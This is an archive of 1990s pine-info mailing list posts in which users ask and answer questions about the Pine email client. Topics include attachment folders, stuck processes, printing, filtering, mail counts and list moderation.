(Here's an example.  Suppose I execute pine from my ~/mail directory, and
then try to save an attachment called mail.gz.  Pine courteously asks:
"Copy attachment to file in current directory: mail.gz", and that sounds
good so I hit return to accept.  Pine then says: "Can't save to file
outside of [~]/mail".  Well, I know that.  But I'm *not* trying to save to
a file outside of ~/mail!  To get it to work, I have to laboriously edit
"mail.gz" to read "~/mail/mail.gz", and that's a kludge I can't live
with.)
 
What gives?  Is my configuration screwed up?  Or is this a known bug?  (I
call it a bug, because if operating-dir is defined, it should be used as
the default for all user-related disk i/o, right?) 
 
Any and all help greatly appreciated.  (But please respond to me directly;
I'm not on pine-info.)  Thanks!
 
Tim Maletic

Don't you also want to set "default-saved-msg-folder"?

You have another pine process running.. perhaps you lost your connection
in the middle of a session.  If it is still a problem, you need to kill
the pine process.

from your unix prompt, type: ps -ux
You should see something like the following:

% ps -ux
USER       PID %CPU %MEM   SZ  RSS TT STAT START  TIME COMMAND
pfarabee 12122 15.4  1.0  288  524 p2 R    08:37   0:00 ps -ux
pfarabee 12032  0.0  0.0  948    0 p0 IW   08:34   0:02 pine
pfarabee 12102  0.0  1.5  256  744 p2 S    08:37   0:00 -tcsh (tcsh)
pfarabee 12020  0.0  0.0  256    0 p0 IW   08:34   0:00 -tcsh (tcsh)
%

Be sure that in the "USER" section, you see your username.
Find the one line that has the "COMMAND" of "pine" (in this case, the
second line)
Look in the section of that line under "PID" (Process ID, in this
case, 12032)

After locating the correct PID, you need to kill it.  The syntax for this
type of a kill is 'kill -9 PID'

For example:
% kill -9 12032

That should kill the stuck process.. of course, repeat the process if you
have more than one pine session that is stuck.

It's just an idea, but perhaps you have the incorrect terminal emulation?
I know that that situation can cause all sorts of weird things to happen.
What exactly were you pressing, in what area of pine, and how many times,
etc.  Also, what version are you running? :)

Well that probably just means that your printer is very persistant.  Some
printers get a bug up their *@@ and can't seem to realize you wanted to
cancel their printing (IE they have a battery-operated memory that holds
what they were printing when you turned them off and then starts over when
you turn them on)

Some printers come equipped with the ability to look into their que and
kill what is there.  You might also try UNPLUGGING the printer from the
wall and not just turning it off.. this may or may not work.

Actually, I think that will just set what folder messages are saved to by
default.. He wants to change the default saved attachment folder.

The problem Tim is running into is that pine wants to save to his current
directory (the directory he was in when he started pine) which may or may
not be in the tree of their mail directory.  He can either create a front
script to put them in their mail directory (not advisable, users could
still just run pine without the script if they know where to find it) or
find the option in pine that controls the default directory to save
attachments.

Actually, after reading more closely, I see that he already has that
option set (operating-dir)  In that case, check this setting out:

feature-list             =
            Set        Feature Name

Someone was nice enough to flame me and send a letter to my
postmaster because of the last message I sent, concerning a
misconfiguration in someone's Pine settings.

I have no idea how the headers got so fudged on it, perhaps it was because
I carbon copied the list instead of sending directly to it?


Anyway, here is the correct letter:

OK....

Then he can simply set up his system such that when users type "pine" t=
hey are 
actually executing "cd ~/mail; pine".  That way they will be placed in =
their mail 
directory.  Of course he will also need to set up the "restricted" shel=

needed.

% which pine
/usr/local/bin/pine
% /usr/local/bin/pin

(Goes into pine, using current dir)

But this is all irrelevant if you read on in my first response =)

I will not continue in this discussion thread after this post.

Hold it. A kill -9 can be a very dangerous thing, and should be used only
as a last resort. Try a kill -HUP <pid> or a kill <pid> first before going
on to a kill -9 <pid>

The -9 signal cannot be trapped by the process, and gives the process no
time to "clean up". This can result in a corrupt inbox or mail folders.

Hello,

I've never had any luck getting PINE to print to my attached printers, be
they an Epson 800+ or an HP 820 Cxi (both ink jets).  I have tried the
default "attached-to-ansi" setting as well as direct printing commands.
Nothing works.  Any suggestions?  PS: the printer is in each case directly
attached to the computer via parallel cables and not networked.

Hi,
   My INBOX which reads  from the file .mailbox has 29 messages permanently.
While .mailbox has  32 messages.Whenever a new mail comes in it is not 
shown  in INBOX.But elm which also reads from .mailbox  displays the 
correct no. of mails in .mailbox (including the new mails).No new mails
are being shown in INBOX.
  Can anybody fix this bug?
Thanx,
Vikram.

sent out to anyone and everyone so be careful what you save and read right
now. Thanks.

If you have access to an "email-to-fax" gateway then there is "no"
problem.  If you don't have access to such a gateway....then you have
trouble.

I wish I could remember quotations...  Something along the lines of:

	There are more things in heaven and on earthm Horatio, than
	{something}

...

Whilst it is true that Pine itself cannot send a FAX message, there _are_
e-mail-to-FAX gateways around the place.  Sending a message to one of
these in the appropriate way does indeed cause it to be FAXed out.

Some sites may run such a gateway for their users.  There are also some
free ones around the place that anyone can use (but the FAXes transmitted
get an advert included on them).

But here's the nub...  Bakhtiar, we (random people around the world
who subscribe to this list) don't know whether your site has its own
gateway (you'll _have_ to ask someone locally if this exists and how to
use it) or whether you're after the free service (which I can't remember
how to use, but that "tpc" may well come into it).

Cheers,

Pine does not filter mail.. you will need to set up procmail or something
similar.  type 'man procmail' for more info

This is not a PINE issue.

You should contact the admin at the offending site.  Perhaps even contact  
the sysadmin at your site and have them contact the offending site.

If the site is not set up properly as you say, then all you will be doing is  
filtering unwanted traffic, which isn't the real solution.

I just received an e-mail from someone on a MAC with an attachment.  How =
do I open the attachment?  It says that it needs the binhex 4.0 to =
convert it.  The extension on the file was .w42.

Thanks

Yes....and No.

Remember a little bit ago there was an announcement that the bridge
between this "mailing list" and the comp.mail.pine newsgroup is broken?

Well, this being a "mailing list" can make it difficult for some to read
the past posts since a "mailing list" is different from a newsgroup.

However, the binhex question had been asked/answered on the newsgroup
recently so it should be easy to find the answer.

Also recently, I did mail to this list a Unix shell script to do the
transformation.  

So, Tim and Nancy, if you want that....just email me and I'll send it to
you.  No sense in sending it to the entire list....again.

The DOS versions are always in the same place as the Windows versions...
however:

The current version of PC-Pine (3.96) hasn't been shrunk enough to run
well in 640K... You might try the version before that, available from:

  ftp.cac.washington.edu/pine/old/PC-PINE-3.95/*

The following flavors are available:

  o DOS: FTP Inc's PC-TCP (pcp_pct.zip)
  o DOS: Novell's LAN Workplace for DOS (pcp_lwp.zip)
  o DOS: Sun's PC-NFS (pcp_pcn.zip)
  o DOS: WATTCP/Packet Driver (pcp_wat.zip)

In attempting to reach the download of a MIME decoder from AOL the darn thing
keeps hanging up on the first twenty or so of a lot of responses to the
keyword search FILE SEARCH. I feel very frusterated by this problem but need
to know if there is an actual MIME DECODER available for download.

	Pardon me, but Pine has a feature I'd like to be able to utilize
outside of pine itself, and was curious whether or not someone could show
me any method of doing so.
	The Pine print function uses an option referred to as attached to
ansi which allows me to telnet to my unix account, and pine will print an
e-mail message at my local terminal printer, wherever that may be.
	While I have long since worked out a work-around procedure
allowing me to print off something from my account, it involves switching
programs around and is a bit of a pain. However, if someone can explain to
me exactly how pine does what it does (Or a script? If possible?), then it
would simplify things considerably for me. 
	Note for reference - Pine has a message saying how to post to this
list. It did not have (Or, more precisely, I did not find) how to
subscribe to this list. With apologies, I would therefore prefer a direct
response to my student account (Repeated below, in case the remailer
strips the headers off this) 
	Thank you, and enjoy your day.

For some reason, my INBOX suddenly became read-only.  I don't understand

This happens to me quite frequently. I'm not sure how or why it happens
(although, I suspect it has to do if you get a sudden disconnect from the
mail server). The fix I have found is -- you need to use the primitive
mail on Unix.... 

mail
1 (to read the 1st message)
pre * (so you don't lose any messages)
quit (exit the mail program).

After that, if you go back into pine everything should be fixed.

Ken

Well, I've added a shell script for you to take a look at. This thing was
originally built to run from a specific software suite, so some of the
options may look a bit strange. Simply avoid them :-)

The script requires the AT&T/USG/V9 style echo command implementation,
using the backslash options (much like C's printf() function).

(bash users: make an alias from echo to "builtin echo -e" or, even better, 
 recompile bash with DEFAULT_ECHO_TO_USG enabled).

Hope this script accomplishes what you're looking for.

Sent both ways. As for subscribing to this list:

  Subscription address:  ListProc@U.Washington.EDU

  Command to subscribe:  SUBSCRIBE listname [FOR alt-email-addr] Your Name

  Command to unsubscribe:  SIGNOFF listname [FOR alt-email-addr]

  Further information about listproc can be obtained by sending a
  message to ListProc@u.washington.edu with a blank subject and a body
  consisting of the single word "HELP".

Kind regards,

Is there a way to import addresses into pine from the aliases in .mailrc ?
 
I like the text editor a lot, and would like to use it not just for email.
After typing the text, I can't Export it immediately, but I send it to
myself and then go to the "sent mail" folder where the Export command is
available. Is there a better way?

I have a mail-reader for reading mail, not a web browser.

This *IS* a list for PINE, which cannot send/read HTML posts like these.

Can we have a ``no HTML posts'' agreement?

Get yourself XEmacs, then you have both. Plus Gnus`s mail washing
capabilities to get rid of The Crap from Redmont(tm).

Can we have a "killfile anything that says MS" agreement?

Did I mention *wanting* the capabilities of reading HTML crap in email?

No?  I didn't think so.

XEmacs probably isn't even available for NeXTstep, and I wouldn't want it  
even if it was... I like my mail reader a LOT, it's better than most I've  
ever used.... I just don't think we need to have HTML posts on a list  
designed for a text-only mailreader.

Sounds fine to me.

	I need to send a message with an attached file, but I don't know
how to do. I got help and read that we need transfer the file for a
machine running pine. I would like to know how to do this.
	Thank you very much for the attention,
Socorro.

Ok...

1. Put it on a disk, and have your sys-admin upload the file to your
   account. Unless you can copy those files yourself. That'd be
   something like 
	mount /dev/fd0 /mnt
	cp /mnt/* ~/
   Then attach the files.

2. ftp them to your account with (whoa!) an ftp program. Those can be
   got from, say, <http://www.yahoo.com> but "modern" versions of
   Windog come with them, anyway. Login with username and password,
   put the files up and attach them.

Cheers,
Robin

No. It's one of pine shortcomings that is well know and equally well
detested. But you can rest assured that there is a good reason that it 
is the way it is.

Unfortunately, this is a feature that is SORELY missing from Pine.
Send a suggestion to the developers (Main Menu - Type 'B').

That there will one day be a Pine 4.00... yes, indeed!

That this particular feature will be included... no! (it was just
done a couple of months ago.)

I never simile and - hey, guess what! I don't even use pine. The editor
gave me the creeps. Will 4.0 have a proper editor? Will it have full
pgp integration? I'd certainly say "thank you" for that. Hehe... but
then again, I could use mutt right away now. It even has *urgh* colours
}:-> But Gnus... well... *rant* *drool* you know... Haha...

Sorry, you are pretty much out of luck.  The message was sent via X.400
and passed thru an X.400<-->RFC822 Gateway.  Actually, some of the headers
suggest that it may have gone RFC822--->X.400--->RFC822

This header

> X400-Content-Type: P2

indicates that the X.400 system is 1984 compliant.  There were many
"broken" gateways back then and some folks haven't gotten around to
upgrading their systems.  

The message came thru nic.in but we have similar troubles with messages
passing thru vsnl.net.in

Regards,
Ed

I am running Pine off my server. I have been downloading articles off the
net and saving them in various folders.
The one folder I have been using extensively has locked  me out. I spoke
to my server and they informed me that I have used too much space in the
folder. It contains over one thousand articles. My server said "Pine
doesn't like it when you save too much in one folder."
I tried to access the folder and my computer gave the message 'exceeded
users disc space'.. and then it created a folder of the same name but with
the word.. lock.. at the end.
DISEASE
DISEASE.lock
I cannot access the original DISEASE folder.
Everytime I try to open the folder it refuses and terminates the
connection.
I asked my server HOW can I access the folder and possible remove to
another folder a percentage of the articles contained therein .. enabling
me to read the articles in that folder.
They could not tell me how to do it. They said you can ZMODEM download the
folder but I am not proficient at this and I have no clue what they are
talking about.
I am hoping someone may be able to give me a clue how to enter the folder
and correct the user space quota?? 
Any help/insight appreciated.

Actually, your help desk people seem to be a little dense. Well,
whatever... 

Basically, your question has nothing to do with pine, and is answered
in the FAQ and the user-guide, both of which are available from the U
of Washington.

You do not, however, need to run zModem (which is totally out of date, 
anyway), but can either make your help desk people show you how to
copy the files on a disk or use ftp to get those files home. 

If you have some free space on another partition, you could also run a 
program like MHonArc to store your messages and then take them home in 
html format (if you don't have pine at home).

Have fun,
Robin

Which editor gave you the creeps?  And as for pgp integration, If you are
willing to try a pine filter written in perl, I can get you about as close
as you can get.

Pico of course. It's an abomination. But so is XEmacs, which I use, so 
let's not start another Holy War here. Anyone checked mcedit? Nice
one, too... ;-)

As I said, I don't use pine anymore, but I spent a good time raving
about pgp-integration about a year ago. And yes, I have pgp-pine by
Roland Rosenfeld and papp by Aldo Valente. But it's just not *it*. Lauch
XEmacs with Gnus and fire up mailcrypt. This is what I would like to see
in pine, because it's easy to use and flexible.

Cheers,
Robin

Guess what... There's a cute little "?" at the bottom of the screen
that says "Help".

---------------------------
| Sorting the Address book |
---------------------------

By default, address book entries are sorted alphabetically on the full
name with distribution lists sorted to the end.  Sorting can be changed by
resetting the address book sort rule in the Pine SETUP CONFIGURATION screen
--assuming you have "write" permission for the address book file.

Unlike the sorting of folders (which only changes presentation), sorting an
address book actually changes the file as it is kept on the computer.  For
this reason you may not be able to sort a shared or system-wide address
book.

SG> how do I down load (and/or print) individual Email messages from
SG> the 'mailbox' ?

And yes, there's another "?". Hit that key, say "w" for WhereIs [1]
and say "print" or "export". That should do the trick.

It seems that every weekend I get a list of all the e-mails that
I have deleted from my in-box RETURNED TO MY IN-BOX so that I have
to delete them all again. This is perhaps the THIRD TIME this has 
occurred. 

What's up?

X-Listprocessor-Version: 8.1 beta -- ListProcessor(tm) by CREN


This message is being sent to this mailing list weekly in order to
aid readers in finding information about Pine.  Before sending questions 
to the mailing list, please consult these resources:

The Pine program itself includes extensive internal, context-sensitive
help.  Additional information, including a User's Guide, Technical Notes, 
Questions & Answers, where to obtain the Pine software, what tools are 
available to perform tasks that Pine itself does not, and more, can be 
accessed:

     - In the Pine Information Center on the World Wide Web at the URL:
       http://www.washington.edu/pine/

     - Via anonymous FTP on the host ftp.cac.washington.edu in the
       subdirectory /pine/docs/. Here, you will find most of the
       documents from the Pine Information Center in plain-text form.

     - The Pine documents on the host ftp.cac.washington.edu can
       also be read from within Pine by defining a folder collection
       (from Pine's MAIN MENU, choose SETUP, Config; then move to
       folder-collections and choose Add Value) as:
            *{ftp.cac.washington.edu/anonymous}pine/docs/[]
    

The messages from this mailing list are archived.  These archives can be 
accessed:

     - In the Pine Information Center on the World Wide Web at the URL:
       http://www.washington.edu/pine/pine-info/
       (includes a searchable index of all archived messages, and information
        on how to subscribe to this mailing list)

     - Via anonymous FTP on the host ftp.cac.washington.edu in the
       subdirectory /pine/pine-info/.

     - From within Pine by defining a folder collection (from Pine's MAIN
       MENU, choose SETUP, Config; then move to folder-collections and 
       choose Add Value) as:
            *{ftp.cac.washington.edu/anonymous}pine/pine-info/[]

Please note: the mailing list is no longer mirrored in the comp.mail.pine 
newsgroup.

If you have a question about Pine, chances are it has been asked before
and you can find the answer either through the searchable index of past
messages, or among the "Questions & Answers" at the URL: 

http://www.washington.edu/pine/QandA/ 
  or
ftp://ftp.cac.washington.edu/pine/docs/QandA.txt

If you need personal assistance with using or configuring Pine, contact
the technical support staff or computer help desk of YOUR Internet Service
Provider, school, university, employer, ... -- whichever organization
provided you with the email account on which you are using, or planning on
using, Pine.  Because system functions and configuration can vary from
site to site, they are best qualified to assist you.  (Due to the large
number of Pine installations worldwide, the University of Washington
cannot provide individual support services to Pine users at other
organizations.)

Looks like your terminal emulation SW is interacting poorly with the arrow

Best call the helpdesk at VSNL.  They are always eager to help.  ;-)

Today when I opened pine, I noticed that my news folders were'nt in my
folder list.  All I have is my Inbox (remote) and SAVEDMAIL/SENTMAIL
(Local) folders.

I'm using pcPine v3.96 for Win95.  When I called my ISP's tech support
dept, the tech who they say is thier pine expert told me that it was a bug
with v3.96 and I should stick to using pine in shell for the time being.
Is this true?

Regards,

Morian

Sure.... go read the notice you received when you signed up for the list.

What.... you didn't save it?  That's not a good idea, as it has important  
information.

Well, just use the same process you used to signon with, in reverse.  You  
managed to subscribe, you should be able to figure out how to unsubscribe.











To signoff from the list, email to listproc@u.washington.edu with the  
following request:

		signoff PINE-INFO
or
		unsubscribe PINE-INFO

To whom it may concern,

I am not able to open my folder.  The computer says I am using a bad login
or password but I am using the same one I always use.  It is very
frustrating.  What is wrong with it?  Should I just keep trying or destroy
my computer?

You mean, you're making a telnet connection and cannot log into the

Trying won't do. If the passwd is not valid, it's not valid.

That's a neat alternative. You know, there are some good websites around
that will show you how to do that properly. I liked the "monitor learns
to fly" part most.

Ok, talk to your sysadmin. She'll know what to do. At least, she's the 
only one who can actually fix your problem.

Cheers,

On what??? Wealth?
Sanford Wallace (cyber promotions) must send you a ton of complete j*u*n*k
mail twenty times a day, within AOL.
I strongly recommend that you examine your outgoing mail, to check where
you're sending it, and if what you are sending makes even the slightest
sense to YOU, just for starters.
Maybe, just maybe, when you take your training wheels off, and leave that
cesspool, laughably referred to as America On Line, but which should
rightly be called the septic tank of America's Lowest Order of Life" get a
REAL Internet account, and find out what's happening in the outside world
(aka THE Internet) maybe you will find out what life...and wealth is all
about.

I agree in principle, but that rather points towards a moderated list, and
that's kind of difficult to accomplish at this point.
Ask Robin, I'm sure he would agree that the lowest common denominator is
regrettably frequent in it's (their) appearance!

I'm just waiting for the listproc to process my unsub request.

The list needs to be subscriber-post only, to start with.

Subscription requests should be confirmed, and the confirmation note should  
inform of the strict anti-spam rules.

IMO.

TjL

ps -- the listproc seems very slow at responding... I guess they don't want  
me to go ;-)

Kindly let me know what E-mail address should one give if he has to send a
message through E-mail to me which I can receive in "PINE".At present all
the messages I am receiving are in "UNIX" for which the address is 
"ipfadm@krcl.ernet.in". Will there be a different type of address to
receive mail in PINE. Please clarify.I shall be thankfull for the reply as
PINE seems to me a better and simpler to use system.
Thanks.

Dear Friends:

Recently I tried an Internet service for what I gave my credit card
number but now that I want to stop buying it their e-mail results to be
a mail loop and I don't get how to tell them to stop billing me.

Could you suggest me something please?

Can someone please shed some light on this problem?

I am running Pine 3.96 on a Sun workstation, running SunOS 4.1.4.
I sent the following message to out Sun Admin folks:


About a week ago, when sending email via Pine, we are
experiencing a hang when pressing ctrl-x to send email. Pine
hangs for about 3 minutes, and then the send takes place.

Pine has not changed in this time, and I am trying to find
out if anything has changed on the Sun side.

The hang takes place 100% of the time when sending email
outside of the company, but only 75% of the time when sending
email to people inside the compaany.


And this was their reply:


Steven,

I do not know much about pine but I do know that
RB is currently running and ES is in the process
of converting to sendmail V8.

Could this new version of sendmail have something
to do with your problem?


Does anyone know if sendmail v8 would affect Pine?

We're discussing that option right now, but would like to get some
discussion from the group.  Does anyone object?

I don't see anything offhand in the listproc config options short of
requiring the owner/subscription-manager to approve all subscriptions. 
I'm not willing to handle that alone; are there any volunteers who
would be willing to help out as subscription manager?

Sorry about that.  It's usually pretty snappy for me, but it does get
bogged down sometimes...

Pine help,
	
	I need some help with Pine.  I am trying to get the "You have 10
messages", thing to work but I can't.  I am using a "bash" system I think.
I have tried putting this line in my ".bash_profile":
echo "You have "`grep -c 'Message-Id: ' $MAIL`" mail messages."
For the $MAIL, I have been using, "/var/spool/mail/mizar", this is where
I think that the INBOX is, but I am not sure.  I have tried lots of
different directories but none of them seem to work, I always end up
getting, "You have 0 mail messages".  Thank you for your help!

Sincerely,
-snreddy@athena.ualr.edu

Same address.

pine is simply a "user agent" of "unix mail".  Of course, the proper term
is not "unix mail".  More proper would be "Internet Mail".

If you were living in the USA or your ISP is in the USA I would call the
"Better Business Bureau".  You can also inform your credit card company,
via postal mail, of a billing dispute.  They can be helpful as well.

Yes!  I object.......

First, the "junk" we see here in the is list isn't all that bad.  One
swift kick with the "d"elete key gets you past.

Second, and more important, many of the folks sending to the mailing list
are "newbies".  Some of them don't know enough to sign up to the list.
They simply send their inquiries "expecting" a response....as in "we"
*are* the helpdesk.  This usually happens at the start of some school
year.

After a few years of being on this list I've *finally* come to realize the
second one.  Since that is the case, I now refrain from shouting "that
question was answered 3X in the last week!!!!".  I only do that on
comp.mail.pine.  ;-)

So, I'd suggest, leave things how they are, instuct folks on how to use
the delete key, and tell folks if they are tired of answering the same
question 3X in one week then move to comp.mail.pine and start shouting!

I don't think the Spam level is so intolerable.  The middle finger on my
left hand works great.  Or, maybe I just have a high threshold of pain? 
I've started to work on my procmail filters in my spare time.....but spare
time is kind of rare at the moment.

David,

One more item.....

If folks spent less time and effort respoonding to (talking about)
messages like "wealth" and "make money fast" or if they'd at least refrain
from doing so on the list.....then we'd have less junk.  

Of course, I just violated what I'm suggesting....but is was to make a
point and you did ask.  :-) :-)

Ed

Good Point Ed! All of us need reminding occasionally.
 I must respectfully point out however that there really are those
questions that ought not to find their way to this or *any* list. It's
worth remembering (IMHO) that Pine is just about as self explanatory as any
e-mail app out there. You need look no further (in most cases) than the
bottom of the screen for some remarkably simple guidance.
THAT'S what makes me a bit psycho occasionally. I have no problem now or
ever, with the user who clearly doesn't see a concept, or who has tried
something only to see it (or Pine) blow up.
Regarding Tim's point re subscription managers, I'd be happy to help out if
my connection was faster than it is, (it's going to be faster soon, and
I'll be happy to do whatever's necessary then)
I have no clue what's involved, but I'd be willing to undertake assistance
if anyone can give me a quick howto when the time comes. Bandwidth is a
serious problem here right now...but within the next three months...no
problem.
Well anyway...that's my two cents worth!
Colin.

Batchman,
	
	At my prompt I typed, "grep -c "Message-Id: "$MAIL" and when I
pressed enter all I got was a, ">".  It didn't show me how many messages
I had or anything like that.
	I did find out what my directory for my INBOX was however.  I typed
mail, and my the directory was "/var/spool/mail/mizar", like I suspected.
When I put that into the .bash_profile though, it didn't work.  It looked
like this:
echo "You have "`grep -c 'Message-Id: ' /var/spool/mail/mizar`" mail
messages."
	It still says, "You have 0 mail messages".  I am not sure what
I am doing wrong here.
	So basically, I have found where the INBOX is, all I need to do
now is to get it to show how many messages I have.
	Your help is greatly appreciated!

Sincerely,
-snreddy@athena.ualr.edu

Colin,

As I continue to "pollute" the list....  :-)

Agree.  I'm not beyond telling people to RTFM.  I just don't suggest they should 
have read it the answer a few days ago.  Depending on what side of the bed I got 
up on, how the cat is treating me, how my wife is treating me, and how my wife is 
treating the cat (ponder that one... :-) ) I may give a "complete" answer or a 
simple "read XXXXX".  I now have another option and that is using Robin's FAQ 
index.

I want to know how to cope with mailing lists.  I don't think this has
ever been mentioned before.  Never seen anyone discuss it.

How does one cope with a flurry of messages from a very many high-volume
mailing lists?  How to keep it all remotely manageable, and be able to
locate important messages?  Pine does not let you subdivide mail that
comes in according to lists.  All mail goes simply in one INBOX.

Now saving mail with 's' command, I press that, and then can type some
folder.  I can never there after be able to locate it.  It will put it in
a folder.  Kind of hard going from folder to folder.  Anyway, once I do
this, my quota gets ever narrower.  I have a very small allowable file
size quota.  The INBOX interestingly does not take up quota space.  But
all other folders add up the total file size space towards the quota.
That quota draws up quick!

I don't really have any interesting method of systematically moving
messages saving them filing them away, downloading, to do this quickly
enough so the INBOX would stay under 50-100 messages.  And if I start
simply deleting a lot, and frequently, then I will definitely be deleting
messages that are important/relevant to me, and would at least like to
refer to sometime.

I need advice.  Is there any?  Or is Pine too old to manage this type of
mail difficulty/organization?

Battchman,
	
	Here is what I have:

echo "You have "`grep -c 'Message-Id: ' varmail messages."
/spool/mail/mizar`" mail messages."

	When I have this, it tells me, "You have 0 mail messages".  I know
that this INBOX directory is correct and that I do have mail messages there.
I get the feeling that Unix does not like me or something!  Thanks for your
help!

Sincerely,
-snreddy@athena.ualr.edu

True.  But then, like many other mail programs, Pine is a "Mail User
Agent".  This means it provides you the user with a (hopefully) pleasant
to use interface to reading your e-mail AFTER it has been delivered into
one or more folders.

Pine plays _no part_ in the mail delivery process itself.  If you want
different mailing lists' messages delivered to different folders then it
is this _delivery process_ you need to persuade, not Pine.  This is
achieved by setting up a filter: the delivery system passes the incoming
message to your filter, which is then responsible for deciding which
folder to write the message to.

You should ask your local Help Desk whether filtering is available on your
computer systems and, if so, how to use it.

If you do go down this route you will find Pine's
"enable-incoming-folders" option (in its Setup Configuration screen)
useful.  Turning this on creates a new "collection" of folders in your
"Folder List" screen ("L" command from Main Menu, Message Index or a
number of other places).  This initially just contains your INBOX.
However you can Add ("A" command) other folders )the ones you filter
your incoming mail into) to this collection.

Normally the Tab command advances you to the next New (Unseen) message in
the current folder.  If you are reading one of several folders in an
incoming collection and have reached the last such message then Tab checks
following incoming folders for recently arrived mail and, if any id found,
offers to let you view them.  This means you can work your way through all
your incoming folders in turn simply by pressing the Tab key (deleting,
saving, printing, etc, messages as you work through them).

Really?  Here are different ways you can move from one folder to another.
Some are better than others if you can remember a folder's name (or the
start of the name).  They assume you are in the Folder Index screen...

*  Press "L" (List Folders);
   Use Arrow Keys to highlight the folder of interest in the list shown;
   Press Return.

*  Press "G" (Goto Folder);
   Type in the full name of the folder of interest;
   Press Return.

*  Press "G" (Goto Folder);
   Type in the first few characters of the name of the folder of interest;
   Press Tab to complete the folder name automatically;
   Press Return.
	(This requires the "enable-tab-completion" to be turned on in
	your Setup Configuration screen.)

*  Press "G" (Goto Folder);
   Press ^T (To Folders) to see the List Folders screen;
   Use Arrow Keys to highlight the folder of interest in the list shown;
   Press Return.

It sounds like you site does as we do... your INBOX is probably held on a
separate, special disk on your mail server.  However messaages you decide
to keep are saved to folders in your normal disk store.  Because the
former is a separate disk it has a separate quota for you (or perhaps even
no quota at all).

This is a fair way of working because it tries to make sure you always
have a reasonable chance of having space to receive newly arriving
messages (in your INBOX, on the mail server).  However if you decide to
keep various messages for future reference it seems right and proper that
they should be saved in your normal directory and charged against its disk
quota; you must learn to balance the desire to hoard messages against the
other demands on your disk space -- everything in this world has a cost!

If you find your disk quota vanishing rapidly then in the first instance
sort through your folders and delete any messages and/or folders you no
longer require.

If you are still short of disk space contact your local Help Desk for
advice; they may even be willing to increase your quota.

I suggest you persue the route I suggest above and enquire about
filtering.

If this is not available to you then you can emulate it to some extent
using a combination of Pine's Select, Zoom, Sort and Apply commands...


1.  Select the messages you want to operate on (this requires the
"enable-aggregate-command-set" option to be turned on in your Setup
Configuration screen)...

For example, to select all New messages:
	; S N
Or to select all messages send "To" the pine-info list:
	; T T pine-info


2.  Having selected some messages (they'll be shown in bold, or with an
"X" in the first column) hide the others from view by using the Zoom
command:
	Z
(To later unzoom, and view them all again, use another "Z" command.)
This lets you concentrate on just the selected messages.


3.  Sort the messages into threaded conversations using the "Ordered
Subject" sort key:
	$ O


4.  Go to the top message in the list:
	^W ^Y
and then start working through reading them, deleting any you do not want
to keep en route.


5.  Use the Expunge command to (permanently) get rid of the deleted
message in your selection:
	X


6.  Now decide what you want to do with any still left selected... you can
operate on them all in one go by using the Apply (A) command: 
	A Y		... applies a Print command to them all
	A S foldername	... applies a Save command to them all, to move
			    them into another folder
	etc

7.  If there are still any messages selected, "drop" them by using the
Select -> Unselect All command:
	; A
(This will automatically unzoom.  If you want to unzoom without
deselecting just give the "Z' command a second time now.)

> I need advice.  Is there any?

See above.  :-)

> Or is Pine too old to manage this type of mail difficulty/organization? 

Nope, it's fine... you just haven't yet experimented enough with it and/or
read its help pages and put 2 + 2 together to see how they can be applied
to your particular need.

Two problems here:

1. filtering
   consult Nancy McGough's fabulous filtering faq

2. scoring/killing
   pine does not do scoring. It doesn't do killfiling, either. Both
   sucks. If you have to deal with many hv-lists (and newsgroups,
   too), you might be interested in trying Gnus for XEmacs. You will
   find adaptive scoring very interesting since it will effectively do 
   away with unwanted (i.e. you are not interested in them) mails and
   news. It will also pre-sort messages for you according to the score 
   the thread/author... has, i.e. most important ones come first.

True. Especially since you cannot see how many messages there are in a 
folder or if new mail has arrived in one. Here's what I see in Gnus:

[ Mailing Lists -- 8:22 ]
*     0: subscription                                       1 
      1: pine                                               2 
      1: Unsort                                             5 
[ News -- 1:3363 ]
      2: comp.mail.pine                                     2 localhost

All information I need available: how many, where, dormant articles
etc. BTW, the folders have different score levels, too, so that I can
zoom in on, say, level 1 where I only keep private mail.

Yes, scoring, killing and expiring. Setting up a cron job that puts your
stuff on disks. Mailing your mail-folders home to you. Anything... Even a
procmail recipe that will file your most important mails to a special
folder and prunes everything else... Gotta look that up in the respective
docs.

AV> Or is Pine too old to manage this type of mail difficulty/organization?

IMAO, it is. You can kluge your way around its limitations, but if I
were in a situation like yours, I'd go for the appropriate tool. That'd
be Gnus.

YMMV,
Robin

Hi all,

I would like to be able to use PGP with Pine. What I would like to be able
to do is, get a message and before sending it encrypt it withe the
recipients public key. A small menu asking me if I want to sign the
message etc. would also be helpful. In the case of a PGP encryped/signed
message, I would like that the reverse happens without me having to
explicitly call the PGP program.

I hope that guys out there have got what I mean to say. Thanks for any
pointers in this regard.

That's why I said "can" since it takes a bit of work to find the archive.
If some people can find the "?" or the "^G" at the bottom of the screen
there is little hope they can find the archive.  :-( :-(

But there should be something like this in the FAQ:

	A: For political reasons, pine does not provide pgp
	   support. However, there are several scripts available on
	   the internet that perform various pgp tasks and can be used

I use pine on a Mac.  How do I attach files to email messages?
Specifically, I want to attach files I"ve made on Microsoft Word.  I asked
the support staff at my university, but they only knew how to do it on a
PC, not on a Mac.  Many thanks.

That won't be accurate.
If someone replies to you and includes your headers, including your
"Message-Id: blah blah blah" header, it will add another count to your
message.. Actually, this message alone would be counted 4 times.. once for
each "Message-Id: " in it.

For instance, on my mail spool, your command gives me:
You have 51 mail message.  (Which is not correct.. I have 82)

Try:
echo "You have `grep -c '^From ' $MAIL` mail messages."

Notice I took out two sets of double quotes.  In the context here, they
aren't needed, and who knows, maybe they were messing something up.

The general pathname for your mail spool is:
/var/spool/mail/username  where "username" is your username.
So if you are running this command on your account on ualr, you need to
use:
/var/spool/mail/snreddy

NEEDED: Beta testers for NEW pgp pine filter
-------------------------------------------------------------------------

Most of you are familiar with pgppine and papp.

A friend of mine and I have taken a copy of papp and performed practically
a total rewrite on it.  The program has many of the old features, like
saving your password encrypted in a session key, but also has some handy
new features, and MUCH more readable output.  If you would like to help us
test it (We haven't found any bugs in it with pine v3.96 and pgp v2.6.2),
just drop me a line.  NOTE: this program is available by request only
until beta testing is completed, then we will post the perl
script wherever.

NOTE: be sure to include something in the Subject of your message
pertaining to beta testing, as my mailbox gets flooded from time to time.

Also, any suggestions as to other places to go for beta testers
would be appreciated.

Thank You,
Patrick Farabee

Anyone know a FREE (i.e. open, public, no money) news server that has
comp.mail.pine ?

Please don't say 'Dejanews.com'. AFAIK, there's no way to connect to it
via NNTP.

I'm sorry, but this is ridiculous.  If I brushed a user off with
an "I don't know", I'd lose my job.  Sheesh.  Perhaps the staff
misconstrued the meaning of 'support' in their job title???

Are you using Pine within a Unix-based account?  If you are, then
you first have to transfer the file from your MAC to your Unix
